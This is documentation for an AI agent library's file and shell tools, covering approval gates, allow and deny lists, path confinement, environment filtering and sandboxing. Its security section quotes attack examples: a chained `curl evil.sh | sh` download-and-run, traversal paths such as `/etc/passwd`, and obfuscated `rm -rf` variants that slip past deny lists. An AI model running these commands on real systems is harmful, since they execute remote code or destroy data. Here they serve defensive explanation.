# Workspace tools

Workspace tools give an agent a file system and a shell, so you can build
coding agents in the style of Claude Code. The tools never use `node:fs` or
`node:child_process` themselves. They call two small interfaces,
`FsProvider` and `ShellProvider`, so the same tools work against a local
directory, an in-memory tree in tests, a Docker container, or a remote
sandbox such as E2B, Daytona or Cloudflare.

```ts
import { AgentExecutor, ToolRegistry, NodeWorkspace, createFsTools, createShellTool } from '@loushy/build-ai-agent';

const workspace = new NodeWorkspace({ root: '.' }); // every path is confined to this directory
const registry = new ToolRegistry();
registry.registerMany([...createFsTools(workspace), createShellTool(workspace)]);

// The shell tool needs approval by default, so the run pauses before any command runs.
const paused = await AgentExecutor.execute({ agent, input, provider, toolRegistry: registry, approvalStore });
// paused.finishReason === 'awaiting-approval' -> resumeAfterApproval(...) once a human approves
```

`createAgent()` has no approval store. If you use it, choose which commands
may run without asking: pass `needsApproval: false` together with an `allow`
list, or a `needsApproval` predicate that returns `false` for the commands
you trust. A tool call that needs approval makes a `createAgent()` run throw.

```ts
import { createAgent, NodeWorkspace, createFsTools, createShellTool } from '@loushy/build-ai-agent';

const workspace = new NodeWorkspace({ root: './project' });
const agent = createAgent({
  instructions: 'You are a careful coding assistant. Run the tests after every change.',
  provider,
  tools: [
    ...createFsTools(workspace),
    createShellTool(workspace, { needsApproval: false, allow: ['npm test', 'npm run lint', 'git status', 'git diff'] }),
  ],
});
const result = await agent.send('Fix the failing test in src/math.test.ts');
```

## The tools

`createFsTools(fs, options?)` returns these `defineTool` tools:

| Tool         | Arguments                                         | Returns |
| ------------ | ------------------------------------------------- | ------- |
| `read_file`  | `path`, optional `offset` (1-based line), `limit` | Numbered lines (`"    12\tcode"`). When the output is cut, the last line says which lines were shown and the `offset` to continue from. Files over 10 MB are refused. |
| `write_file` | `path`, `content`                                 | Creates or overwrites the file and creates missing parent directories. |
| `edit_file`  | `path`, `old_string`, `new_string`, optional `replace_all` | Replaces the exact text. Fails with a message the model can act on when `old_string` is missing (including a hint about CRLF line endings) or appears more than once without `replace_all`. |
| `list_dir`   | optional `path`                                   | Sorted entries; directories end with `/`. |
| `glob`       | `pattern`, optional `path`                        | Sorted paths of matching files. `*` stays within one directory, `**` crosses directories, plus `?`, `[abc]` and `{a,b}`. |
| `grep`       | `pattern` (JavaScript regex), optional `path`, `glob`, `ignore_case` | `path:line: text` for each matching line. An invalid regex is a tool error. Binary files and files over 2 MB are skipped. |

| Option            | Default                     | Meaning |
| ----------------- | --------------------------- | ------- |
| `readOnly`        | `false`                     | Only create `read_file`, `list_dir`, `glob` and `grep`. |
| `needsApproval`   | none                        | Per tool: `{ write_file: true, edit_file: ({ path }) => !path.startsWith('src/') }`. |
| `maxReadLines`    | 2000                        | Most lines `read_file` returns per call. |
| `maxOutputChars`  | 50,000                      | Most characters a tool returns per call. |
| `maxResults`      | 200                         | Most paths, matches or entries `glob`, `grep` and `list_dir` return. |
| `maxFilesScanned` | 20,000                      | Most files a `glob` or `grep` walk visits. |
| `ignore`          | `['.git', 'node_modules']`  | Directory names `glob` and `grep` skip. |

`createShellTool(shell, options?)` returns one tool, `shell`, that takes
`command` and an optional `timeout_ms`. It returns
`{ exitCode, stdout, stderr }`. When the command was killed, the result also
has `timedOut: true` or `aborted: true` and a `note` saying why.

| Option             | Default   | Meaning |
| ------------------ | --------- | ------- |
| `needsApproval`    | `true`    | `true`, `false`, or a predicate over the command string. |
| `allow`            | none      | When set, only matching commands may run. |
| `deny`             | none      | Matching commands are refused. |
| `defaultTimeoutMs` | 120,000   | Timeout when the model does not pass `timeout_ms`. |
| `maxTimeoutMs`     | 600,000   | A larger `timeout_ms` is lowered to this value. |
| `maxOutputChars`   | 30,000    | Per stream. Beyond this the start and end of the output are kept and the middle is replaced by a marker. |
| `cwd`, `env`       | none      | Working directory (relative to the workspace) and extra variables for every command. |
| `name`             | `'shell'` | Tool name. |

```ts
import { createShellTool, NodeWorkspace } from '@loushy/build-ai-agent';

const shell = createShellTool(new NodeWorkspace({ root: '.' }), {
  needsApproval: (command) => !/^(ls|cat|git (status|diff|log))\b/.test(command), // read-only commands run without asking
  deny: ['rm -rf', /\bsudo\b/],
  defaultTimeoutMs: 60_000,
});
```

Cancelling the run (`agent.send(input, { signal })` or
`AgentExecutor.execute({ signal })`) kills the running command together with
every process it started: a process group on Linux and macOS, and
`taskkill /T` on Windows.

## Security model

Read this before you give a model a shell.

### What is enforced

**Paths stay inside the root.** Before any file is touched, `NodeWorkspace`
(and `MemoryWorkspace`) normalizes each path. These are rejected on every
platform:

- `..` that climbs above the root (`../secret`, `src/../../secret`)
- absolute paths (`/etc/passwd`, and an absolute path that points inside the root)
- Windows drive letters (`C:\Windows`, `C:secret`)
- UNC and extended-length paths (`\\server\share`, `//server/share`, `\\?\C:\`)
- NUL bytes

Backslashes count as separators everywhere, so mixing separators
(`src/..\..\secret`) cannot hide a `..`. On Windows, `:` (alternate data
streams), reserved device names (`CON`, `NUL`, `COM1`, ...) and segments made
only of dots and spaces (Windows drops trailing dots and spaces, so `.. `
would act as `..`) are rejected too.

**Symlinks cannot escape.** After that check, `NodeWorkspace` resolves the
path with `realpath`. If the path does not exist yet, it resolves the deepest
part that does exist. The result must still be inside the root's own real
path. This means:

- A link inside the root that points outside it is rejected for reads, and
  for writes to files that do not exist yet (`escape-link/new.txt`).
- A link whose target does not exist is never followed, because writing
  through it could create a file outside the root.
- `glob` and `grep` never follow links while walking the tree.
- `rm` on a link removes the link itself and leaves its target alone.

**Rejections are tool errors.** A refused path, a missing file or an
ambiguous edit throws a `WorkspaceError` inside the tool. The model receives
`{ "error": "WorkspaceError", "toolName": "read_file", "message": "..." }`
and the run continues. Messages show the workspace path, never the host
path.

**Commands get a minimal environment.** `NodeWorkspace` runs commands with
`cwd` set to the root. It does not pass on the parent process's environment.
Only `PATH`, `HOME`, `USERPROFILE`, `TEMP`, `TMP`, `TMPDIR` and `LANG` are
copied, plus `SystemRoot`, `SystemDrive`, `ComSpec`, `PATHEXT` and `WINDIR`
on Windows, because cmd.exe and most programs need them to start. So
`OPENAI_API_KEY` and other secrets in your server's environment are not
visible to commands the model writes. To give commands more, either pass
values (`env: { GITHUB_TOKEN: scopedToken }`) or name host variables to copy
(`inheritEnv: ['CI']`). Anything you pass this way is visible to the model.

```ts
import { NodeWorkspace } from '@loushy/build-ai-agent';

const workspace = new NodeWorkspace({
  root: './project',
  env: { NODE_ENV: 'test' },        // added for every command
  inheritEnv: ['CI', 'NODE_OPTIONS'], // copied from the host environment
});
```

**The shell tool needs approval by default.** Unless you choose otherwise,
every command waits for a human. `allow` and `deny` are checked first, so a
refused command is never offered for approval:

- A string pattern matches a command that is exactly the pattern, or starts
  with it followed by a space (`'git status'` matches `git status -s`).
- In `allow`, a command matched only by a string pattern must not contain
  shell operators (`;` `&` `|` `` ` `` `$(` `<` `>` or a newline). This stops
  `git status; curl evil.sh | sh` from passing as `git status`.
- A RegExp is tested against the whole command line, so anchor it:
  `/^npm (test|run lint)$/`.
- `deny` string patterns are checked against each `;`, `&` or `|` separated
  part of the command.

### What is NOT enforced

- **`NodeWorkspace`'s shell is not a sandbox.** Path confinement applies to
  the file tools only. A command runs as your OS user and can read, write or
  delete anything that user can, including `../` and `~/.ssh`, and it can use
  the network. Approval and `allow` lists reduce the risk, but they are not
  isolation. For untrusted input, such as prompts from the public or content
  fetched from the web, give the shell tool a sandbox-backed `ShellProvider`
  (see below) and use the file tools with `readOnly: true` or approval.
- **A deny list is a convenience.** A shell has many ways to write the same
  command (`r''m -rf`, `$(echo rm)`, an extra space, a script file), so do not
  rely on `deny` for security. Use `allow` for that.
- **Races and hard links.** Paths are checked, then used. A process that
  swaps a directory for a symlink between those two steps can get around the
  check. Such a process already has local access, for example a command the
  shell tool ran without a sandbox. A hard link inside the root to a file
  outside it cannot be detected.
- **`grep` runs the model's regex in your process.** A pathological pattern
  can be slow. Lines and files are capped, but the regex engine itself is not
  time-limited.

### Sandboxed shell: `SandboxShell`

`SandboxShell` adapts any `SandboxAdapter`, for example the Docker-backed
`SubprocessSandbox`, into a `ShellProvider`. Each command runs as
`sh -c "<command>"` in a new container with no network. The container sees
only `cwd`, which is bind-mounted at the same path. It gets only the `env`
you pass, nothing from the host. File tools can keep using `NodeWorkspace`
on the same directory:

```ts
import { createFsTools, createShellTool, NodeWorkspace, SandboxShell, SubprocessSandbox } from '@loushy/build-ai-agent';

const workspace = new NodeWorkspace({ root: './project' });
const shell = new SandboxShell(new SubprocessSandbox({ image: 'node:20-alpine' }), { cwd: workspace.root });
const tools = [...createFsTools(workspace), createShellTool(shell, { needsApproval: false })];
```

`SandboxAdapter` has no way to cancel a command. When the run is aborted,
`SandboxShell` returns `aborted: true` immediately, but the container keeps
running until its timeout kills it. The shell tool always sets a timeout, so
the container does stop.

## Writing your own provider

Both interfaces are small. Paths are workspace-relative and use `/`.
`normalizeWorkspacePath()` applies the same checks the built-in providers
use. A provider exposed to a model must confine paths itself, because a
custom tool could call it directly. Throw `WorkspaceError` with a readable
message on failure.

```ts
import { normalizeWorkspacePath, WorkspaceError, type FsProvider, type ShellProvider } from '@loushy/build-ai-agent';

// A stand-in for your remote sandbox SDK (E2B, Daytona, Cloudflare, ...).
declare const remote: {
  read(path: string): Promise<string | null>;
  write(path: string, data: string): Promise<void>;
  list(path: string): Promise<{ name: string; dir: boolean }[]>;
  run(cmd: string, opts: { cwd: string; timeoutMs?: number }): Promise<{ out: string; err: string; code: number }>;
};
const base = '/home/user/project';
const abs = (path: string) => `${base}/${normalizeWorkspacePath(path, 'posix')}`;

export const remoteFs: FsProvider = {
  async readFile(path) {
    const data = await remote.read(abs(path));
    if (data === null) throw new WorkspaceError(`File not found: ${path}`);
    return data;
  },
  writeFile: (path, content) => remote.write(abs(path), content),
  async stat(path) {
    const data = await remote.read(abs(path));
    return data === null ? undefined : { type: 'file', size: data.length };
  },
  async readdir(path) {
    return (await remote.list(abs(path))).map((e) => ({ name: e.name, type: e.dir ? 'directory' : 'file' }));
  },
  async mkdir(path) { await remote.run(`mkdir -p '${abs(path)}'`, { cwd: base }); },
  async rm(path, options) { await remote.run(`rm ${options?.recursive ? '-r ' : ''}'${abs(path)}'`, { cwd: base }); },
};

export const remoteShell: ShellProvider = {
  async exec(command, options = {}) {
    const r = await remote.run(command, { cwd: abs(options.cwd ?? '.'), timeoutMs: options.timeoutMs });
    return { stdout: r.out, stderr: r.err, exitCode: r.code, timedOut: false };
  },
};
```

`ShellProvider.exec` should resolve, not reject, for a non-zero exit code,
a timeout (`timedOut: true`) or an abort (`aborted: true`). It should reject
only when the command could not be started.

## Testing with `MemoryWorkspace`

`MemoryWorkspace` keeps the file tree in memory and checks paths the same
way. Its `exec` is a stub you program, and every command it receives is
recorded. Combine it with `mockModel` for deterministic tests:

```ts
import { createAgent, createFsTools, createShellTool, MemoryWorkspace } from '@loushy/build-ai-agent';
import { mockModel } from '@loushy/build-ai-agent/testing';

const workspace = new MemoryWorkspace({
  files: { 'src/math.ts': 'export const add = (a: number, b: number) => a - b;\n' },
  exec: (command) => (command === 'npm test' ? { stdout: '1 passed\n' } : { exitCode: 1, stderr: 'unknown command\n' }),
});
const provider = mockModel([
  { toolCalls: [{ name: 'edit_file', args: { path: 'src/math.ts', old_string: 'a - b', new_string: 'a + b' } }] },
  { toolCalls: [{ name: 'shell', args: { command: 'npm test' } }] },
  'Fixed add() and the tests pass.',
]);
const agent = createAgent({
  instructions: 'Fix bugs.',
  provider,
  tools: [...createFsTools(workspace), createShellTool(workspace, { needsApproval: false })],
});
await agent.send('add() is broken');
console.log(workspace.snapshot()['src/math.ts']); // '... a + b;\n'
console.log(workspace.commands.map((c) => c.command)); // ['npm test']
```
